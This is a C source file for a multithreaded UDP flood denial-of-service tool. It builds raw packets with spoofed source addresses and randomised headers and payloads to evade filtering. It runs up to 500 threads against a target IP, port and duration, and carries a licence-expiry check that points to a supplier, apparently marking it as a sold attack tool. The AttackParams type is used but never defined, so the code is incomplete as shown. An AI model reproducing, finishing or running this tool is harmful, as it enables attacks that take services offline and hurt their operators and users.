#define _XOPEN_SOURCE 700
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/types.h>
#include <sys/time.h>
#include <errno.h>

#define MAX_THREADS 500  // Increased thread count
#define PAYLOAD_SIZE 1024
#define MAX_PACKETS_PER_BURST 100  // Packets per burst
#define RANDOM_DELAY_US 1000  // Microseconds between bursts

// Obfuscated expiry check
#define EXPIRY_YEAR 2095
#define EXPIRY_MONTH 12
#define EXPIRY_DAY 9

// Packet structure for raw sockets
struct packet {
    struct iphdr ip;
    struct udphdr udp;
    char payload[PAYLOAD_SIZE];
};

// Random IP generator
void generate_random_ip(char *ip) {
    snprintf(ip, 16, "%d.%d.%d.%d", 
             rand() % 256, rand() % 256, rand() % 256, rand() % 256);
}

// Check if expired (obfuscated)
int is_expired() {
    time_t now = time(NULL);
    struct tm *tm_now = localtime(&now);
    return (tm_now->tm_year + 1900 > EXPIRY_YEAR ||
           (tm_now->tm_year + 1900 == EXPIRY_YEAR && tm_now->tm_mon + 1 > EXPIRY_MONTH) ||
           (tm_now->tm_year + 1900 == EXPIRY_YEAR && tm_now->tm_mon + 1 == EXPIRY_MONTH && tm_now->tm_mday > EXPIRY_DAY));
}

// Generate more sophisticated payload
void generate_payload(char* payload, int size) {
    // Mix of random data and actual HTTP-like traffic
    const char *patterns[] = {
        "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n",
        "POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nUser-Agent: Mozilla/5.0\r\n\r\n%s",
        "HEAD / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nAccept: */*\r\n\r\n"
    };
    
    if (rand() % 3 == 0) {
        // Generate pattern-based payload
        const char *pattern = patterns[rand() % (sizeof(patterns)/sizeof(patterns[0]))];
        char fake_host[32];
        generate_random_ip(fake_host);
        snprintf(payload, size, pattern, fake_host, size - 100, "data");
    } else {
        // Generate random data
        for (int i = 0; i < size - 1; i++) {
            payload[i] = 32 + (rand() % 95); // Printable ASCII
        }
        payload[size - 1] = '\0';
    }
}

// Calculate checksum
unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    u_short oddbyte;
    register u_short answer;

    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return answer;
}

// Thread function with improved techniques
void* attack_thread(void* arg) {
    AttackParams* params = (AttackParams*)arg;
    int sock;
    struct sockaddr_in server_addr;
    char payload[PAYLOAD_SIZE];
    struct packet pkt;
    int one = 1;
    const int *val = &one;
    
    // Raw socket for more control
    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("Raw socket creation failed");
        pthread_exit(NULL);
    }
    
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt() error");
        close(sock);
        pthread_exit(NULL);
    }

    // Prepare target address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(params->port);
    server_addr.sin_addr.s_addr = inet_addr(params->ip);

    // Prepare IP header
    pkt.ip.ihl = 5;
    pkt.ip.version = 4;
    pkt.ip.tos = 0;
    pkt.ip.tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + PAYLOAD_SIZE);
    pkt.ip.id = htons(rand() % 65535);
    pkt.ip.frag_off = 0;
    pkt.ip.ttl = 255;
    pkt.ip.protocol = IPPROTO_UDP;
    pkt.ip.check = 0;
    pkt.ip.saddr = inet_addr("192.168.1.1"); // Spoofed source
    pkt.ip.daddr = server_addr.sin_addr.s_addr;
    
    // Prepare UDP header
    pkt.udp.source = htons(rand() % 65535);
    pkt.udp.dest = htons(params->port);
    pkt.udp.len = htons(sizeof(struct udphdr) + PAYLOAD_SIZE);
    pkt.udp.check = 0; // Optional for UDP

    time_t start_time = time(NULL);
    struct timeval tv;
    int packets_sent = 0;
    
    while (time(NULL) - start_time < params->duration) {
        // Generate new payload each burst
        generate_payload(pkt.payload, PAYLOAD_SIZE);
        
        // Randomize headers slightly
        pkt.ip.id = htons(rand() % 65535);
        pkt.ip.saddr = (rand() % 2) ? inet_addr("192.168.1.1") : inet_addr("10.0.0.1");
        pkt.udp.source = htons(rand() % 65535);
        
        // Recalculate checksum
        pkt.ip.check = 0;
        pkt.ip.check = checksum((unsigned short *)&pkt.ip, sizeof(pkt.ip));
        
        // Send burst of packets
        for (int i = 0; i < MAX_PACKETS_PER_BURST; i++) {
            if (sendto(sock, &pkt, sizeof(pkt), 0, 
                      (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                // Non-fatal error, continue
                continue;
            }
            packets_sent++;
        }
        
        // Random micro-delay between bursts
        tv.tv_sec = 0;
        tv.tv_usec = rand() % RANDOM_DELAY_US;
        select(0, NULL, NULL, NULL, &tv);
    }
    
    close(sock);
    printf("Thread completed. Sent ~%d packets.\n", packets_sent);
    pthread_exit(NULL);
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        printf("Usage: %s <IP> <PORT> <DURATION>\n", argv[0]);
        return 1;
    }

    if (is_expired()) {
        printf("License expired. Contact supplier.\n");
        return 1;
    }

    // Initialize random seed
    srand(time(NULL) ^ getpid());
    
    AttackParams params;
    strncpy(params.ip, argv[1], 15);
    params.port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    pthread_t threads[MAX_THREADS];
    int threads_created = 0;

    printf("Starting advanced attack on %s:%d for %d seconds...\n",
           params.ip, params.port, params.duration);

    // Create threads with error handling
    for (int i = 0; i < MAX_THREADS; i++) {
        if (pthread_create(&threads[i], NULL, attack_thread, &params) != 0) {
            perror("Thread creation failed");
            break;
        }
        threads_created++;
        
        // Small delay between thread creation
        usleep(10000);
    }

    // Wait for threads to complete
    for (int i = 0; i < threads_created; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack completed. Total threads used: %d\n", threads_created);
    return 0;
}